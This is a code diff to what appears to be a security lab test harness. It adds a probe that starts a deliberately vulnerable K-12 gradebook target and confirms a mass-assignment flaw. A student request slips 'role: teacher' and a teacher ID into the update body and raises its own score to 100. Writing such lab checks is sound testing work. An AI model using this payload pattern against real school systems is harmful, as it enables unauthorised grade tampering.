@@ -72,10 +72,42 @@ async function probeRosterIdor() {
   return ["target: k12-roster-idor", "cross_tenant_roster_read: confirmed"]
 }
 
+async function probeGradebookMassAssignment() {
+  const { proc, base } = await startTarget("k12-gradebook-mass-assignment")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-gradebook-mass-assignment") fail(proc, "health probe failed")
+
+  const before = await fetch(`${base}/api/gradebook/student?studentId=student-3001`).then((res) => res.json()) as {
+    records?: Array<{ score?: number }>
+  }
+  if (before.records?.[0]?.score !== 82) fail(proc, "gradebook baseline probe failed")
+
+  const update = await fetch(`${base}/api/gradebook/update`, {
+    method: "POST",
+    headers: { "content-type": "application/json", "x-user-id": "student-3001" },
+    body: JSON.stringify({
+      studentId: "student-3001",
+      courseId: "math-8",
+      role: "teacher",
+      teacherId: "teacher-math",
+      score: 100,
+    }),
+  }).then((res) => res.json()) as { authorized?: boolean; grade?: { score?: number }; labFinding?: string }
+
+  if (!update.authorized || update.grade?.score !== 100 || update.labFinding !== "student_grade_mass_assignment") {
+    fail(proc, "gradebook probe did not confirm student write escalation")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-gradebook-mass-assignment", "student_grade_mass_assignment: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
   ...(await probeRosterIdor()),
+  ...(await probeGradebookMassAssignment()),
 ]
 
 console.log(lines.join("\n"))
